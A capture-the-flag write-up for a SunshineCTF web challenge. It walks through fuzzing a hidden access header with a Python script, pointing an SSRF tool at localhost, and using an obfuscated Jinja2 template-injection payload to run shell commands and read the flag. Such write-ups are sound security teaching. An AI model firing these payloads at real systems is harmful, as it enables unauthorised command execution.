## Goal

We have to get the flag through SSRF Tool

## My Solution

This is the home page when we visit the website.

![Guide image](/images/posts/web-forge-1.png)

Through the content of the home page, and the menu links we just have the SSRF Tool which is in `/fetch` url where we can take step in it.

Access to `/fetch` we can receive this message `403 Forbidden: missing or incorrect SSRF access header`. It gives us a hint: we're missing a header attribute that it needs.

I found out `/robots.txt` is accessible in this website. It has this content:

```
User-agent: *
Disallow: /admin
Disallow: /fetch

# internal SSRF testing tool requires special auth header to be set to 'true'
```

Therefore, that special header has to be set to `true`.

Use a `header_fuzzer.py` script, we will find that header.

```python
import requests

def find_ssrf_access_header(url):
    """
    Tests a list of highly probable custom HTTP headers and a specific cookie
    to find the one that grants access to the SSRF endpoint by bypassing the
    403 Forbidden response.
    """
    print(f"[*] Starting access bypass fuzzing against: {url}")

    # List of highly probable custom headers for internal/CTF access bypass
    possible_headers = [
        # --- Core SSRF & Auth Bypass Headers ---
        "X-SSRF-Access",
        "SSRF-Access",
        "X-SSRF-Auth",
        "SSRF-Auth",
        "X-Allow-SSRF",
        "Allow-SSRF",
        "Enable-SSRF",
        "X-Enable-SSRF",
        "X-Internal-SSRF",
        "Internal-SSRF",
        "X-Access-Allowed",
        "Access-Allowed",
        "X-Bypass",
        "Bypass-Security",
        "X-Security-Override",
        "Security-Override",
        "X-Challenge-Bypass",
        "Allow"
    ]

    # The required value based on the robots.txt hint
    required_value = 'true'
    found_bypasses = []

    # We use a 403 status code as the failure indicator
    EXPECTED_FAILURE_CODE = 403

    # Set up generic headers for testing
    generic_headers = {'User-Agent': 'CTF-Header-Fuzzer/1.0'}

    # --- 1. Test standard headers ---
    for header_name in possible_headers:
        # Construct the headers dictionary for the request
        test_headers = generic_headers.copy()
        test_headers[header_name] = required_value

        print(f"[*] Testing Header: {header_name} -> {required_value}...", end=" ")

        try:
            # Using GET for the initial check, as it's less likely to trigger rate limits
            response = requests.get(url, headers=test_headers, timeout=5)
            status_code = response.status_code
            print(f"Status: {status_code}")

            if status_code != EXPECTED_FAILURE_CODE:
                found_bypasses.append({
                    "type": "Header",
                    "name": header_name,
                    "value": required_value,
                    "status": status_code,
                    "preview": response.text[:50].replace('\n', ' ')
                })
                print(f"[!!! SUCCESS !!!] Header: {header_name} changed the response!")

        except requests.exceptions.RequestException as e:
            print(f"Error connecting: {e}")

    print("\n--- Fuzzing Complete ---")
    if found_bypasses:
        print("[+] Potential Access Bypass(es) Found:")
        for bypass in found_bypasses:
            print(f"    - Type: {bypass['type']} | Name: {bypass['name']}: {bypass['value']} | Status: {bypass['status']} | Preview: '{bypass['preview']}...'")
        print("\nUse the successful method (Header or Cookie) along with the 'url' parameter in a POST request to access http://127.0.0.1/admin.")
    else:
        print("[-] No success. The required bypass might be non-standard or missing from the list.")

if __name__ == "__main__":
    TARGET_URL = "https://wormhole.sunshinectf.games/fetch"
    find_ssrf_access_header(TARGET_URL)
```

We can see that `Allow -> True` gives us access to this internal SSRF Tool.

![Guide image](/images/posts/web-forge-2.png)

We cannot add header in normal browser, so from now I will use **Postman** to interact with this internal SSRF Tool _(you can use Burp Suite or whatever you're familiar with)_.

![Guide image](/images/posts/web-forge-3.png)

Let's try type target to `http://127.0.0.1/admin` to see how this tool works since the flag is in `/admin`.

![Guide image](/images/posts/web-forge-4.png)

It said I missing template query param. I try `http://127.0.0.1/admin?template=something` and I got this error.

```
ERROR: HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: /admin?template=something (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7989bc777240>: Failed to establish a new connection: [Errno 111] Connection refused'))
```

`Connection refused` maybe I still get access to the correct `/admin` so I have to port fuzzing. I found port 8000 is open. Type `http://127.0.0.1:8000/admin?template=something` to the target.

![Guide image](/images/posts/web-forge-5.png)

Hmm, so whatever I type to the `template` it will return the same. I got stuck here a little but the website need template so I try SSTI payloads online.

You can get a lot from [https://github.com/payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads).

I tried all of them and there is just one payload works.

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

![Guide image](/images/posts/web-forge-6.png)

The result is:

```
uid=999(unprivileged) gid=999(unprivileged) groups=999(unprivileged)
```

Now we get access to it, just exploit with bash commands:

Payload:

```
http://127.0.0.1:8000/admin?template={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -la')|attr('read')()}}
```

Use `ls -la`, the result is:

Use `cat flag.txt` for somehow it returns `Nope.` so I just run `cat flag` to get the flag

Flag: `sun{h34der_fuzz1ng_4nd_ssti_1s_3asy_bc10bf85cabe7078}`
